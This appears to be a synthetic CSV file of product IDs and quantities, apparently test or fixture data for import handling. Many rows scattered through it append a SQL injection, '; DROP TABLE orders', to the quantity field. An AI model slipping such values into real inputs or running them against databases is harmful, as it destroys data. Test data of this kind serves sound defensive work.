product_id,quantity
240,480
246,253
197,277
228,229
135,58
235,247
164,116
266,183
160,109
149,269
255,345
239,158
195,180
274,49
228,170
158,273; DROP TABLE orders
203,321
261,352
118,123
191,298; DROP TABLE orders
298,446
164,251
219,127; DROP TABLE orders
116,332
242,439
229,127
294,356
116,24
244,166
292,157
222,291
274,402
106,416
208,273
210,133
116,224
207,51
262,375
116,411
148,283
247,38
179,126
214,38
135,442
202,302
213,443
215,103
231,265
107,150
121,425
237,170
268,85
212,107
128,65
235,69
116,486
234,287
197,256
299,48
120,351
101,105
109,194
296,273
195,247; DROP TABLE orders
210,151
106,92
160,321
240,72
134,130
193,333
184,75
165,349
247,217; DROP TABLE orders
190,267
128,229
202,118
150,398
257,10
299,220
252,416
115,244
226,20
265,210
238,10
297,384
256,393; DROP TABLE orders
156,205
225,102
137,195
177,206
272,149
297,296
291,389
109,390
221,295
167,362
166,116
295,318
246,26
255,102
152,427; DROP TABLE orders
102,194
265,347
244,37
269,391
241,84
147,389
180,228
252,408
251,357
124,143
137,71
139,419
183,364
245,463
103,390
185,382
226,451; DROP TABLE orders
128,231
237,278
291,484
275,157
295,458
236,133
205,409
162,456
194,197
139,414; DROP TABLE orders
149,227
124,425
102,133
105,338
181,209
148,436
106,183
181,388; DROP TABLE orders
273,240
202,494
137,448
116,326
179,293
255,143
104,302
198,43
239,292
227,258
281,437
188,335
223,37
206,351
150,172
199,93
288,359
295,264
160,208
270,380
269,490
289,372
193,324; DROP TABLE orders
189,387; DROP TABLE orders
225,155
169,392
203,261
271,453
262,253
170,161; DROP TABLE orders
253,279
226,126; DROP TABLE orders
183,427
274,89
274,468
250,230
264,429
239,167
267,273
223,117
114,219
131,211
146,89
178,461
282,480
298,484
160,322
283,254
235,136
156,98
293,393
123,219
215,476
222,307
192,420
215,173
135,72
174,25
110,422
129,239
272,288
134,305
158,83
108,55
264,254
255,205
160,215
193,424
295,448; DROP TABLE orders
269,40
238,369
247,176; DROP TABLE orders
100,385
134,288
132,200
262,451
184,119
227,485
157,128
243,151
283,105
264,223
227,177
175,41
259,428
237,442
135,41
273,73
172,316
141,499
250,394
175,431
160,67
235,119
287,305
252,461
100,427
295,465
122,488
112,240
142,431
139,52
122,297
113,424
240,348; DROP TABLE orders
276,266
283,370
280,453
238,346
188,291
198,232
273,138
200,374
220,342
209,120
182,344
252,358
247,73
120,464
123,242
145,381
222,389
262,228
269,57
291,134
247,128
165,99
195,296; DROP TABLE orders
129,417
129,159
269,26
167,300
189,50
229,493
155,465
147,145
217,25
182,230
269,240
259,241; DROP TABLE orders
280,157
260,336; DROP TABLE orders
245,479
185,389
284,193
139,234
284,214
227,247
192,431
101,495
241,460
219,186
162,473
100,265
132,211
216,342
159,17
121,330
210,330
189,193
197,448; DROP TABLE orders
251,101
288,252
261,491
191,494
245,359
174,291
296,196
172,376; DROP TABLE orders
294,248
230,181
110,13
184,195
134,95
261,235
199,423
274,452
137,491
142,478
240,423
174,358
270,482
274,319
152,423
106,258
289,202
241,109
296,382
252,478
118,297
220,256
248,137
112,71
102,285
181,43
218,99
244,446
287,272
128,115
266,328
232,85
288,216
159,443
129,390
288,378
114,308
210,479
291,222
210,19
199,421
112,49
235,31
111,108
199,181
131,448
246,408
161,317
274,60
154,55
123,258
263,127
201,16
236,173
143,57
233,228
194,336
133,371
245,251; DROP TABLE orders
128,259; DROP TABLE orders
244,331; DROP TABLE orders
208,414
240,331
131,116
186,180
126,76
134,344
147,302
111,226
207,459
225,315
297,409
263,418
241,341
144,46
280,435
291,202
136,230
109,184
188,311
101,34
117,378
217,405
231,208
292,22
249,477
292,379
299,270
132,423; DROP TABLE orders
191,266
103,426
297,73
280,55
202,227; DROP TABLE orders
283,358
185,443
140,405
148,265
188,296
182,196
244,334
253,172
266,80
158,211
132,81
187,88
168,251
129,36
149,61
127,23
281,62
282,480
109,499
199,102
104,251
271,485
124,385
149,290
235,323
245,276
228,131
210,121
186,251
264,327
167,99
256,338
286,455
122,29
260,145
260,212
159,132
116,46; DROP TABLE orders
298,14
254,135
248,68
199,459
123,412
264,411
151,278
202,284
166,13
254,209
120,281
291,139
163,29
156,444
163,370
249,444
108,211
139,402
219,148
184,297
145,298
253,16
159,462
195,408
215,210
138,183
100,256
289,318
297,82
154,49
239,80
216,199
103,478
209,86
189,106
257,299
117,397
131,86
120,179
261,388
215,257
151,333
138,335
177,327
267,139
210,353
216,54
120,10; DROP TABLE orders
198,418
163,361
165,488
170,482
247,317
102,442
110,218
184,354
147,63
280,310
270,387
276,263
183,127
210,75
146,381
208,188
290,131
200,54
193,127
204,411
193,329
293,204
163,182
234,417
230,82
222,498
181,441
290,308
196,27
280,273
203,201
247,124
217,435
220,466
225,494; DROP TABLE orders
165,51
111,168
227,186
215,364
216,209
204,102
255,272
133,292
165,286
209,75
121,356
237,451
212,55
298,345; DROP TABLE orders
109,101
213,425
239,375
126,88
157,397
293,283
162,26
190,472
112,25; DROP TABLE orders
267,261
155,314
211,46
263,412
222,441; DROP TABLE orders
251,322
148,430; DROP TABLE orders
164,241
214,39
191,499
132,165
185,140
140,342
103,467
232,30; DROP TABLE orders
272,176
170,423
236,408
255,296; DROP TABLE orders
242,500
145,277
196,425
286,92
121,182
284,489
153,475
159,166
251,100
193,86
236,490
126,68
150,386
124,317
233,223
287,249
107,248
119,51
269,281
127,193
170,434
291,392
149,432
289,94
242,399
195,236
182,390
247,55
185,221; DROP TABLE orders
250,140
277,493; DROP TABLE orders
102,41
104,114
107,478
108,394
203,245
184,426
135,101
266,174
247,126
276,259
121,277
161,413
234,218
138,166
286,375
141,188
285,51
153,437
166,101
128,253
215,462
259,153
112,477
233,127
178,448
211,147
183,281
249,430
103,299
266,23
201,430
208,427
264,447
107,199
155,228
200,12
114,40
263,374
270,102
179,327
199,198
170,79
223,467
173,111
207,345
159,368
151,194
169,466
111,285
123,356
275,294
222,388
163,293
155,459
210,234
245,269
231,115
171,92; DROP TABLE orders
256,481
293,41
289,331
165,253
137,179
257,247
206,68
191,33
236,289
219,272
112,354
296,165; DROP TABLE orders
279,442
206,92
164,291
188,156; DROP TABLE orders
227,484
262,421
108,360
102,62
126,452
278,226
159,479
298,21
138,460
155,335
228,176
229,355
196,273
192,490
255,471
201,365
242,304
254,269
173,47
295,255
224,29
187,375
268,357; DROP TABLE orders
260,304
182,483
236,42
171,172
185,140
214,84; DROP TABLE orders
259,165
286,17
174,460
235,152
187,282
156,442
280,130
106,117
222,345
148,192
142,366
136,400
199,249
177,83
137,84
289,205
140,60
274,481
255,427
285,331
172,225
134,321
195,78
237,274
170,182
123,435
265,177
146,413
217,352
166,470
223,384
229,363
164,62
194,376
229,126
262,50
115,314
257,463
294,187
245,191
268,491; DROP TABLE orders
119,130
157,21
245,140
178,313
278,204; DROP TABLE orders
127,70
229,473
167,445
250,258; DROP TABLE orders
228,347
161,73
247,447
122,36
247,58
167,92
182,303
122,456
213,219
193,344
151,102
207,142
278,222; DROP TABLE orders
227,447
125,35
289,498
227,260
197,439
178,421
238,123
229,454
273,305
176,127
256,289
109,371
145,64
290,329
202,191
212,353; DROP TABLE orders
226,256
286,419
234,372
214,149
148,457
199,138; DROP TABLE orders
274,278
167,447
163,33
124,136
114,381
221,241
167,254
221,36
285,284
149,241
216,70
134,327
296,353
212,20
119,222
100,263
288,229
273,79
130,324
244,330
243,191
143,117
201,89
145,236
117,62
102,302
179,312
260,354
270,373
169,280
213,93
166,443
214,489; DROP TABLE orders
226,74
105,171
107,347
236,75; DROP TABLE orders
204,328
160,245
126,44
279,163
259,24
118,235
265,240
188,139
180,16
277,480
244,54
131,314
147,313
213,313
142,483
231,299; DROP TABLE orders
196,327
104,267
175,38
162,162
205,11
258,232; DROP TABLE orders
164,81
130,62; DROP TABLE orders
217,288
271,66
216,105
148,301
238,382
119,334; DROP TABLE orders
230,64
121,42
153,470
145,110
118,288
155,118
129,451
216,448
202,448
274,231
199,179
247,259
220,155
219,29
288,364
139,251
247,165
113,453
138,189
141,219
101,321
209,309
145,209; DROP TABLE orders
106,204
289,400
146,164
128,48
229,291
271,59
191,452
204,44
218,161
185,307
172,446
211,468
220,249
195,158
213,347
134,421
136,453
275,192
284,56
189,79
119,152
157,381
190,307
100,386; DROP TABLE orders
188,31
177,369
243,159
223,133
195,418
191,311
288,410
291,230
213,235
112,208
106,303
252,344
169,129
105,416
238,176
155,419
115,131
184,372
181,318
138,106
147,224
294,29
151,268
124,105
232,414
106,15
132,327
141,128
290,246
285,75
184,233
158,254
182,467
140,480
170,299
181,159
106,61; DROP TABLE orders
105,380
272,234
256,133
104,131
210,298
169,146
158,173
212,498
176,185
143,464
160,18
130,70
258,94
266,438
286,93
234,464
127,498
154,27
101,329
129,447
169,418
160,309
290,31; DROP TABLE orders
151,269
239,149
230,277
129,74
254,209
139,240
199,264; DROP TABLE orders
150,426
170,357
171,172
292,180
268,298
174,20
265,474
124,140
299,312
228,134
265,340
227,491
116,403; DROP TABLE orders
287,217; DROP TABLE orders
148,243
146,250
126,290
221,119
151,44
119,291
146,26
167,260
242,105
298,142
106,414
282,214
190,186
176,165
267,213
237,381
231,487; DROP TABLE orders
135,88
158,257
294,370
257,427
185,209; DROP TABLE orders
226,67
190,327
111,456
242,207
112,475
104,229
280,28
136,229
141,234
234,109
182,113
121,489
206,500
131,303
194,108
125,245; DROP TABLE orders
221,48
180,493; DROP TABLE orders
121,308
117,57
166,74; DROP TABLE orders
167,134
299,274; DROP TABLE orders
149,353
134,480
197,353
164,438
265,363
101,301
147,374
188,461
285,404
287,192
289,14
190,188
160,310
247,135
106,150
240,212
208,252
117,60
187,178
189,231
255,273
113,244
234,396
182,141
255,209
219,206
198,170
132,446
223,413
207,459
179,172
266,464
198,84
261,80; DROP TABLE orders
145,184
202,353; DROP TABLE orders
288,172
238,253
101,259
217,382; DROP TABLE orders
129,288
296,232; DROP TABLE orders
200,119
286,366
288,332
138,472
249,119
190,132
195,190
274,343
256,184
138,116
137,372
167,157
132,144
299,197
254,360
271,354
251,408
240,81
257,446
269,495
206,131
262,216
222,148
202,113
220,282
215,445
152,88
250,341
217,417
196,76
262,475
142,260
214,410
180,419
169,66
211,44
150,306
179,143
232,151
197,465
153,147
190,35
259,392
193,29
247,184
263,373
165,128
226,198
281,56
186,22
149,352
160,301
205,197
147,74
224,426
299,81; DROP TABLE orders
252,409
260,115
256,236; DROP TABLE orders
292,12
252,354
293,368
116,367
240,284
238,388
151,476
111,285
169,221; DROP TABLE orders
198,48
156,400
161,208
150,127
115,342
173,485
183,488
261,296
230,276
127,368
107,253
101,263
241,473
117,416
143,158
173,312
275,162
293,35
143,73; DROP TABLE orders
258,426
188,171
289,486
209,45
199,455
164,295
179,496
236,75
142,281
192,212
145,169
151,28
144,130
298,189
106,421
267,240
210,290; DROP TABLE orders
209,360
173,209
203,405
136,387
151,287
135,135
271,269
152,342
218,448
265,223
108,462
128,415
199,236
212,324
176,344
130,46
247,119
122,127
227,81
294,127; DROP TABLE orders
277,146
208,71
207,190
171,168
224,259
291,426
282,304
178,21
250,37
216,474
241,153
174,438
158,19
207,332
231,337
106,96; DROP TABLE orders
213,134
192,10
185,95
178,228
187,496
150,442
128,181
199,182; DROP TABLE orders
233,456
289,234
118,252
244,485; DROP TABLE orders
110,254
224,499
148,172
296,192
205,73
190,161
297,100
108,188
120,11
283,455
262,144
129,485
231,486
218,232
107,416
183,147
169,458
149,187
148,342
214,196
277,384
100,76
239,96
144,10
260,410
124,80
244,257
272,379
208,14
222,104
286,367
129,473
241,489
225,285
152,288
174,327
100,492
252,70; DROP TABLE orders
150,445
104,47
163,284
183,476
221,173
266,422
228,259
283,437
256,439
249,302
157,276
171,497
205,10
181,361
268,66
109,453
169,139
147,215
162,369
154,306; DROP TABLE orders
116,498
292,49
274,16
286,183
182,150
191,333
194,153
147,57
261,352
228,412
282,262
143,379
258,360
140,237
176,413
226,398
172,168
299,310
279,75
201,286
299,273
126,110; DROP TABLE orders
288,45
282,303
119,192
193,256
206,130
183,148; DROP TABLE orders
240,372
241,23
231,243; DROP TABLE orders
214,416
117,270
297,349
248,423
267,499
184,35
190,73
125,296
129,29
139,195
274,281
185,457
250,275
174,351
186,279
242,281
155,44
267,337
113,178
180,394
159,477
141,349
264,334
262,429
169,343
124,227
230,25
161,201
211,123
100,493
216,373
203,217
290,300
279,15
219,456
104,441
233,150; DROP TABLE orders
200,40
234,405
255,289
135,226
113,318
280,24
268,476
290,181
215,179
106,243
249,121
219,83
116,245
115,277; DROP TABLE orders
187,278
255,396
112,464
113,294
119,471
107,385
242,461
287,197
120,29
130,304
112,122
149,285
212,346
177,323
231,197
242,201
133,391
114,235
286,99
109,62
146,43
119,267
272,450
158,178
241,142
103,412
109,44
297,410
208,344; DROP TABLE orders
276,454
286,480
114,84
251,385
154,407
170,295
258,346
201,16
171,26
194,325
111,250
106,152
247,343
167,301
148,12
222,475
247,370; DROP TABLE orders
241,158
203,486
215,297
188,426
215,359
142,21
238,62
142,472
222,49
138,74
107,237
249,218
281,426
104,311
166,208
104,87
267,452
277,16
209,484
135,152
149,492; DROP TABLE orders
113,47
199,175
152,255
216,183
153,43
265,337
133,38
209,380
241,77
102,147
170,356
260,428
227,485
272,416
275,56
120,136
291,325
240,196
120,411
291,361
185,367
133,31
272,377
138,195
241,354
225,459
195,455
102,65; DROP TABLE orders
206,448
164,194
142,98
108,206
191,44
163,284
216,444
126,375
177,148
288,228
106,85
173,427; DROP TABLE orders
259,261
255,172
217,278
176,159
290,344
275,500
195,416
275,275
176,206
284,125
235,385
220,126
284,480
289,474
168,24
200,19
253,299
250,448
280,356
121,235; DROP TABLE orders
209,386
244,411
227,132
110,445
186,410
264,19
213,211
234,420
133,98
216,398
118,487
119,143
210,494
101,123
225,266
219,441
226,326
172,117
253,366
166,87
129,175
235,48
136,194
137,377
196,297
118,418
131,448
177,133
210,299
114,178
188,403
270,340
213,156
223,163
110,341
235,168
190,190
145,23
283,400
225,333
237,286
247,257
247,47
236,416
193,158
183,164
135,14
220,442
157,418
239,308; DROP TABLE orders
117,356
195,356
121,208
175,46
141,77
144,405
182,473
196,76
182,107
282,13
164,88
131,271
113,105
269,483
131,259
298,171
112,16
105,23
294,148
203,334
231,441; DROP TABLE orders
120,312
106,123; DROP TABLE orders
235,116
287,74
182,246
190,241
276,35
276,111
160,492
262,140; DROP TABLE orders
292,225
148,289; DROP TABLE orders
274,34
176,68; DROP TABLE orders
296,419; DROP TABLE orders
184,322; DROP TABLE orders
295,387
117,139
238,23
236,134
170,16
138,289
251,119
221,266
220,140
233,135
172,101
175,460
135,169
185,13
226,97
138,310
180,84
101,412
264,362
220,38
116,10
219,59
103,280
228,250
115,461
195,286
159,145
271,198
288,498
171,75
189,125
123,387
266,140; DROP TABLE orders
199,151
205,428
194,17
170,37
111,413
212,139
294,432
209,453
208,116
297,258
250,466
123,440
208,216
115,25
135,355
204,47; DROP TABLE orders
185,426
175,57
244,291; DROP TABLE orders
267,459
108,95
240,481
100,150; DROP TABLE orders
135,204
103,262; DROP TABLE orders
217,376
287,73
158,98
156,243
219,375
206,359
189,493
185,105
258,420
127,265
237,93
224,11
230,330
286,306; DROP TABLE orders
131,153
238,112
178,273
176,473
125,117
229,260
143,60
131,30
108,251
146,359
156,265
148,389
194,276
291,302
120,145
299,424
264,319
194,393; DROP TABLE orders
138,392
134,216
191,421
233,385
269,45
160,409
275,107
268,220
208,146
101,80
267,156
215,11
258,295
295,201
287,331
135,441
289,358; DROP TABLE orders
293,89
143,241
250,342
134,489
165,489
126,327
218,493; DROP TABLE orders
146,488
218,462
115,440
277,47
110,279
204,487
189,330
268,320
109,367
224,135
169,118
103,224
244,332
170,84
254,492
168,199
149,349
107,229; DROP TABLE orders
240,230
140,374
117,115
249,292
202,343
278,289
281,448
187,160
280,240; DROP TABLE orders
259,390
282,356
193,267
174,33
227,121
291,221
128,336
191,307
152,152
248,323
146,437
113,11
242,202
173,193
235,396
172,216
132,333
120,382
181,399
284,193
191,419
115,434
121,330
240,348
225,246
254,154; DROP TABLE orders
141,311
185,102
101,445
196,132
185,419
132,182
148,369
185,136
266,360
202,93
129,320; DROP TABLE orders
225,398; DROP TABLE orders
293,406
274,437
214,219
215,392
204,459
253,83
143,176
125,188
144,315
270,431
127,363
280,72
280,160
260,47
164,445
243,80
194,435
274,257
217,158
140,441
219,139
200,381
144,469
188,218
271,45
192,259
278,139
143,103
100,198
294,155
263,220
175,364
173,454
290,474
298,410
184,316
279,89
286,225
288,419
198,436
299,348
122,132
197,194
164,304
106,318
285,311
286,172
102,412
227,400
235,198
203,498; DROP TABLE orders
259,402
149,251
260,339
263,62
134,164
213,441
139,437
243,108
187,429
222,468
292,343; DROP TABLE orders
143,426
276,330
156,77
261,342
144,344
119,482
294,74
280,457
141,102
285,68
258,498
294,45
178,26
166,404
156,243
242,95
260,138
227,219
128,439
265,140
195,386
235,466
126,38
174,118
273,67
266,21
129,493
298,160
290,94
257,422
268,386
152,102
170,379
268,373
157,261; DROP TABLE orders
145,157
126,93
158,189
109,489
106,352
250,139
263,491
241,34; DROP TABLE orders
294,11
192,70
273,320
286,90
298,154
236,242
284,79
147,495
282,462
206,41
233,193
284,195
273,98
193,393
211,437
102,444
100,473
129,22
262,76
233,461
280,202
165,486
160,89
214,295
202,226
104,46
109,446; DROP TABLE orders
203,135
175,286
204,182
114,408
219,431
199,130
291,242
182,30
162,79
190,431
284,135
163,222
268,467
270,27
214,131
281,22
287,373; DROP TABLE orders
243,335; DROP TABLE orders
259,288
193,325
286,201
238,56
226,471; DROP TABLE orders
204,439
130,306
262,98
288,208
176,433
123,429
188,226
141,394
197,159
158,83
189,240
222,36
189,65
275,366
276,233
106,324
259,104
292,246
162,154
193,323
179,343
215,122
279,419
232,173
162,454
212,169
238,474
103,320
263,295
273,479
181,224
104,124; DROP TABLE orders
172,200
297,333
266,286
218,338
298,387
163,265; DROP TABLE orders
228,194
298,451
228,476
261,200
168,213
258,131
261,363
222,174
263,217
263,419
104,88
202,347
267,380
145,320
149,265
290,189
286,350
293,190
238,12
200,317
125,427
271,194; DROP TABLE orders
201,429
103,264; DROP TABLE orders
152,150
192,455
145,491
201,251
128,377
101,293
173,403
272,234; DROP TABLE orders
137,224
129,265; DROP TABLE orders
244,199
207,400
136,149
296,453
257,106
111,348
197,382
213,220
264,422
246,106
218,205
299,156
204,469
276,327
267,433
105,196
156,30
136,241
231,355
185,35
235,295
253,109
217,199
143,457
203,497; DROP TABLE orders
243,49
297,398
271,49
171,235
244,13
106,257
208,271
105,475
209,196
151,442
143,22
235,335
121,462
182,113
291,447
201,127
187,192
196,181
116,411; DROP TABLE orders
206,199; DROP TABLE orders
260,490
133,355
128,46
129,496
103,360; DROP TABLE orders
109,430
273,220
199,194
115,234
277,253
166,461
282,219
209,468
218,373
153,214
125,465
208,404
289,388; DROP TABLE orders
267,104
210,463
150,381
281,27
191,191
263,39
128,290
286,193
186,416; DROP TABLE orders
223,367
268,207
100,289
168,319
258,450
137,73
247,14
148,312
197,76
257,179
145,327
188,90
294,379
108,337
132,266
159,137; DROP TABLE orders
298,151; DROP TABLE orders
234,170
279,354; DROP TABLE orders
200,137
240,206
298,63
200,182
200,295
116,84
196,276
191,474
144,367; DROP TABLE orders
205,33
168,488
237,191
162,272
299,455
115,223
165,165
299,234; DROP TABLE orders
105,459
268,64
271,309
293,358
267,300
196,456
202,167
109,259; DROP TABLE orders
255,286
188,27
171,221
242,134
186,190
298,105
